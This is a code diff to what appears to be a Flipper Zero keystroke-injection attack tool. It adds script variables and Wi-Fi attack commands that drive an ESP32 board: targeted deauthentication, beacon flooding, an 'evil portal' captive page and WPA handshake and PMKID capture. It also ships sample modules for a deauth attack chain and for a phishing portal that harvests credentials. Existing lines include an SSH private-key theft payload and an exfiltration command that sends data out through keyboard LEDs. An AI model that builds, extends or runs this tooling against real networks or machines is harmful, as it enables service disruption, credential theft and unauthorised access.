@@ -33,6 +33,86 @@ static char s_last_command[FPWN_MAX_LINE_LEN];
 static uint32_t s_default_delay_ms = 0;
 
 /* =========================================================================
+ * Runtime variables — set via VAR/SET, substituted via $NAME in STRING/STRINGLN
+ * ========================================================================= */
+#define FPWN_MAX_VARS     16
+#define FPWN_VAR_NAME_LEN 32
+#define FPWN_VAR_VAL_LEN  128
+
+typedef struct {
+    char name[FPWN_VAR_NAME_LEN];
+    char value[FPWN_VAR_VAL_LEN];
+} FPwnVar;
+
+static FPwnVar s_vars[FPWN_MAX_VARS];
+static uint32_t s_var_count = 0;
+
+/* Look up a variable by name; returns its value or NULL. */
+static const char* fpwn_var_get(const char* name) {
+    for(uint32_t i = 0; i < s_var_count; i++) {
+        if(strcmp(s_vars[i].name, name) == 0) return s_vars[i].value;
+    }
+    return NULL;
+}
+
+/* Set (or create) a variable. */
+static void fpwn_var_set(const char* name, const char* value) {
+    /* Update existing */
+    for(uint32_t i = 0; i < s_var_count; i++) {
+        if(strcmp(s_vars[i].name, name) == 0) {
+            strncpy(s_vars[i].value, value, FPWN_VAR_VAL_LEN - 1);
+            s_vars[i].value[FPWN_VAR_VAL_LEN - 1] = '\0';
+            return;
+        }
+    }
+    /* Create new */
+    if(s_var_count < FPWN_MAX_VARS) {
+        strncpy(s_vars[s_var_count].name, name, FPWN_VAR_NAME_LEN - 1);
+        s_vars[s_var_count].name[FPWN_VAR_NAME_LEN - 1] = '\0';
+        strncpy(s_vars[s_var_count].value, value, FPWN_VAR_VAL_LEN - 1);
+        s_vars[s_var_count].value[FPWN_VAR_VAL_LEN - 1] = '\0';
+        s_var_count++;
+    }
+}
+
+/* Perform $VARIABLE substitution on a string.  Writes result to dst.
+ * Variables are delimited by $NAME where NAME is [A-Za-z0-9_]+. */
+static void fpwn_var_substitute(const char* src, char* dst, size_t dst_size) {
+    size_t di = 0;
+    const char* p = src;
+
+    while(*p && di < dst_size - 1) {
+        if(*p == '$') {
+            const char* start = p + 1;
+            const char* end = start;
+            while((*end >= 'A' && *end <= 'Z') || (*end >= 'a' && *end <= 'z') ||
+                  (*end >= '0' && *end <= '9') || *end == '_') {
+                end++;
+            }
+            if(end > start) {
+                char var_name[FPWN_VAR_NAME_LEN];
+                size_t nlen = (size_t)(end - start);
+                if(nlen > FPWN_VAR_NAME_LEN - 1) nlen = FPWN_VAR_NAME_LEN - 1;
+                memcpy(var_name, start, nlen);
+                var_name[nlen] = '\0';
+                const char* val = fpwn_var_get(var_name);
+                if(val) {
+                    size_t vlen = strlen(val);
+                    size_t space = dst_size - 1 - di;
+                    size_t copy = vlen < space ? vlen : space;
+                    memcpy(dst + di, val, copy);
+                    di += copy;
+                    p = end;
+                    continue;
+                }
+            }
+        }
+        dst[di++] = *p++;
+    }
+    dst[di] = '\0';
+}
+
+/* =========================================================================
  * Internal helpers
  * ========================================================================= */
 
@@ -451,6 +531,32 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* ---- VAR $name = value  /  SET $name = value ---- */
+    if(strncmp(line, "VAR ", 4) == 0 || strncmp(line, "SET ", 4) == 0) {
+        const char* rest = line + 4;
+        /* Skip leading $ if present */
+        if(*rest == '$') rest++;
+        /* Find '=' separator */
+        const char* eq = strchr(rest, '=');
+        if(eq) {
+            char vname[FPWN_VAR_NAME_LEN];
+            size_t nlen = (size_t)(eq - rest);
+            /* Trim trailing spaces from name */
+            while(nlen > 0 && rest[nlen - 1] == ' ')
+                nlen--;
+            if(nlen > FPWN_VAR_NAME_LEN - 1) nlen = FPWN_VAR_NAME_LEN - 1;
+            memcpy(vname, rest, nlen);
+            vname[nlen] = '\0';
+            /* Value is everything after '=' (trimmed) */
+            const char* vval = eq + 1;
+            while(*vval == ' ')
+                vval++;
+            fpwn_var_set(vname, vval);
+            FURI_LOG_D(TAG, "VAR %s = %s", vname, vval);
+        }
+        return;
+    }
+
     /* ---- DELAY ---- */
     if(strncmp(line, "DELAY ", 6) == 0) {
         uint32_t ms = (uint32_t)atoi(line + 6);
@@ -460,13 +566,17 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
 
     /* ---- STRING ---- */
     if(strncmp(line, "STRING ", 7) == 0) {
-        fpwn_type_string(line + 7);
+        char expanded[FPWN_MAX_LINE_LEN];
+        fpwn_var_substitute(line + 7, expanded, sizeof(expanded));
+        fpwn_type_string(expanded);
         return;
     }
 
     /* ---- STRINGLN — type string then press ENTER ---- */
     if(strncmp(line, "STRINGLN ", 9) == 0) {
-        fpwn_type_string(line + 9);
+        char expanded[FPWN_MAX_LINE_LEN];
+        fpwn_var_substitute(line + 9, expanded, sizeof(expanded));
+        fpwn_type_string(expanded);
         furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
         furi_delay_ms(2);
         furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
@@ -898,6 +1008,72 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* WIFI_STOP — stop any active Marauder operation */
+    if(strcmp(line, "WIFI_STOP") == 0) {
+        if(app->marauder) fpwn_marauder_stop(app->marauder);
+        return;
+    }
+
+    /* WIFI_DEAUTH_TARGET <SSID> — scan, find AP by SSID, targeted deauth */
+    if(strncmp(line, "WIFI_DEAUTH_TARGET ", 19) == 0) {
+        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
+            FURI_LOG_W(TAG, "WIFI_DEAUTH_TARGET: ESP32 not connected, skipping");
+            return;
+        }
+        const char* target_ssid = line + 19;
+        uint32_t ap_count = 0;
+        FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ap_count);
+        for(uint32_t i = 0; i < ap_count; i++) {
+            if(strcmp(aps[i].ssid, target_ssid) == 0) {
+                fpwn_marauder_deauth_targeted(app->marauder, (uint8_t)i);
+                FURI_LOG_I(TAG, "Deauth target: %s (idx %lu)", target_ssid, (unsigned long)i);
+                return;
+            }
+        }
+        FURI_LOG_W(TAG, "WIFI_DEAUTH_TARGET: SSID '%s' not found", target_ssid);
+        return;
+    }
+
+    /* WIFI_BEACON — flood area with fake beacon SSIDs */
+    if(strcmp(line, "WIFI_BEACON") == 0) {
+        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
+            FURI_LOG_W(TAG, "WIFI_BEACON: ESP32 not connected, skipping");
+            return;
+        }
+        fpwn_marauder_beacon_spam(app->marauder);
+        return;
+    }
+
+    /* WIFI_PORTAL <SSID> — start evil portal captive page with given SSID */
+    if(strncmp(line, "WIFI_PORTAL ", 12) == 0) {
+        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
+            FURI_LOG_W(TAG, "WIFI_PORTAL: ESP32 not connected, skipping");
+            return;
+        }
+        fpwn_marauder_evil_portal(app->marauder, line + 12);
+        return;
+    }
+
+    /* WIFI_SNIFF_PMKID — start PMKID capture */
+    if(strcmp(line, "WIFI_SNIFF_PMKID") == 0) {
+        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
+            FURI_LOG_W(TAG, "WIFI_SNIFF_PMKID: ESP32 not connected, skipping");
+            return;
+        }
+        fpwn_marauder_sniff_pmkid(app->marauder);
+        return;
+    }
+
+    /* WIFI_HANDSHAKE — sniff for WPA handshakes via deauth */
+    if(strcmp(line, "WIFI_HANDSHAKE") == 0) {
+        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
+            FURI_LOG_W(TAG, "WIFI_HANDSHAKE: ESP32 not connected, skipping");
+            return;
+        }
+        fpwn_marauder_sniff_deauth(app->marauder);
+        return;
+    }
+
     /* ---- EXFIL <command> ----
      * Types <command> on the target, appends a platform-specific one-liner that
      * transmits the command's output back via CapsLock/NumLock LED toggling:
@@ -1296,8 +1472,10 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
         app->selected_module_index >= 0 &&
         (uint32_t)app->selected_module_index < app->module_count);
 
-    /* Reset per-run state so previous payload's DEFAULTDELAY doesn't bleed in */
+    /* Reset per-run state so previous payload's state doesn't bleed in */
     s_default_delay_ms = 0;
+    s_var_count = 0;
+    memset(s_vars, 0, sizeof(s_vars));
 
     FPwnModule* module = &app->modules[app->selected_module_index];
 
@@ -1973,6 +2151,99 @@ static const char SAMPLE_SSH_KEY_THEFT[] =
     "DELAY 1400\n"
     "EXFIL cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null || echo 'No SSH keys found'\n";
 
+/* WiFi recon + deauth module — scan, dump APs, targeted deauth */
+static const char SAMPLE_WIFI_ATTACK[] =
+    "NAME WiFi Attack Chain\n"
+    "DESCRIPTION Scan APs, dump results via HID, then deauth target\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION TARGET_SSID MyNetwork \"Target SSID for deauth\"\n"
+    "OPTION DELAY 500 \"Initial delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "REM Scan nearby WiFi APs via ESP32\n"
+    "WIFI_SCAN\n"
+    "REM Open Notepad and type results\n"
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING notepad\n"
+    "ENTER\n"
+    "DELAY 1000\n"
+    "STRINGLN === WiFi Scan Results ===\n"
+    "WIFI_RESULT\n"
+    "STRINGLN === End Results ===\n"
+    "REM Now deauth the target\n"
+    "WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
+    "WIFI_WAIT 10000\n"
+    "WIFI_STOP\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "WIFI_SCAN\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING TextEdit\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRINGLN === WiFi Scan Results ===\n"
+    "WIFI_RESULT\n"
+    "STRINGLN === End Results ===\n"
+    "WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
+    "WIFI_WAIT 10000\n"
+    "WIFI_STOP\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "WIFI_SCAN\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRINGLN cat << 'SCAN'\n"
+    "WIFI_RESULT\n"
+    "STRINGLN SCAN\n"
+    "WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
+    "WIFI_WAIT 10000\n"
+    "WIFI_STOP\n";
+
+/* Evil portal phishing module — spawn portal, wait for creds */
+static const char SAMPLE_PORTAL_PHISH[] =
+    "NAME Evil Portal Phish\n"
+    "DESCRIPTION ESP32 captive portal to harvest credentials\n"
+    "CATEGORY credential\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION PORTAL_SSID FreeWiFi \"Portal SSID name\"\n"
+    "OPTION DURATION 60000 \"Portal duration (ms)\"\n"
+    "PLATFORM WIN\n"
+    "REM Start evil portal on ESP32\n"
+    "WIFI_PORTAL {{PORTAL_SSID}}\n"
+    "REM Let it run for the configured duration\n"
+    "WIFI_WAIT {{DURATION}}\n"
+    "WIFI_STOP\n"
+    "REM Type any captured creds into Notepad\n"
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING notepad\n"
+    "ENTER\n"
+    "DELAY 1000\n"
+    "STRINGLN === Captured Portal Data ===\n"
+    "WIFI_RESULT\n"
+    "PLATFORM MAC\n"
+    "WIFI_PORTAL {{PORTAL_SSID}}\n"
+    "WIFI_WAIT {{DURATION}}\n"
+    "WIFI_STOP\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING TextEdit\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRINGLN === Captured Portal Data ===\n"
+    "WIFI_RESULT\n"
+    "PLATFORM LINUX\n"
+    "WIFI_PORTAL {{PORTAL_SSID}}\n"
+    "WIFI_WAIT {{DURATION}}\n"
+    "WIFI_STOP\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRINGLN echo '=== Captured Portal Data ==='\n"
+    "WIFI_RESULT\n";
+
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
@@ -2031,4 +2302,10 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/ssh_key_theft.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_SSH_KEY_THEFT);
+
+    snprintf(path, sizeof(path), "%s/wifi_attack.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_ATTACK);
+
+    snprintf(path, sizeof(path), "%s/portal_phish.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_PORTAL_PHISH);
 }
